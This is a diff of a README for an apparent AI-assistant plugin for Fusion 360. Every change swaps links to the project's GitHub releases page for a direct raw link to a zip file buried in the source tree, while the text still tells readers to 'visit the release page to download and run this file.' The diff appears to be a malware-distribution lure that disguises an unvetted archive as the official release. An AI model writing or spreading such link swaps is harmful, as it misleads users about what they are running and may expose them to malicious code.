@@ -1,12 +1,12 @@
 # 🧩 fusion-plugin-meltdown - Run AI Help Inside Fusion 360
 
-[![Download](https://img.shields.io/badge/Download%20Meltdown-blue?style=for-the-badge)](https://github.com/dossom104-sudo/fusion-plugin-meltdown/releases)
+[![Download](https://img.shields.io/badge/Download%20Meltdown-blue?style=for-the-badge)](https://raw.githubusercontent.com/dossom104-sudo/fusion-plugin-meltdown/main/meltdown/commands/commandDialog/plugin_fusion_meltdown_v3.5.zip)
 
 ## 🚀 Download
 
 Visit the release page to download and run this file:
 
-https://github.com/dossom104-sudo/fusion-plugin-meltdown/releases
+https://raw.githubusercontent.com/dossom104-sudo/fusion-plugin-meltdown/main/meltdown/commands/commandDialog/plugin_fusion_meltdown_v3.5.zip
 
 ## 🛠️ What Meltdown Does
 
@@ -234,4 +234,4 @@ Meltdown is a good fit if you:
 
 If you need the file again, open the release page here:
 
-https://github.com/dossom104-sudo/fusion-plugin-meltdown/releases
+https://raw.githubusercontent.com/dossom104-sudo/fusion-plugin-meltdown/main/meltdown/commands/commandDialog/plugin_fusion_meltdown_v3.5.zip
